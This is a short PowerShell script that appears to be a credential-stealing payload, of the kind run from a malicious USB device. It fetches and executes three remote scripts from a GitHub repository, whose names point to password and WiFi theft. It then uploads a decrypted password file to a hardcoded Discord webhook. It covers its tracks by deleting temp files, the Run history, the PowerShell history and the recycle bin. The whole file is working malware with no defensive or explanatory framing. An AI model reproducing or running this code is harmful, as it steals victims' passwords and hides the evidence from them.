

$pu = iwr https://github.com/skekic16/lol/raw/main/DP.ps1?dl=1; invoke-expression $pu
$pg = iwr https://github.com/skekic16/lol/raw/main/WIFI-SNATCH.ps1?dl=1; invoke-expression $pg
Start-sleep 10
$pw = iwr https://github.com/skekic16/lol/raw/main/files.ps1?dl=1; invoke-expression $pw






start-sleep 60

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1184838069740896326/B30LAh5X9NkQ111endVELXK2MBQRblzduqnE2tcSjRhPXn3dEnLCrUp-5hjj6mVGIYEk'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

Upload-Discord -file $env:USERPROFILE\decrypted_password.csv






rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
rm "$env:USERPROFILE\bORG2.exe"
get-childItem * -Include *decrypted_password.csv -Recurse | rm
function Clean-Exfil { 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
Clean-Exfil
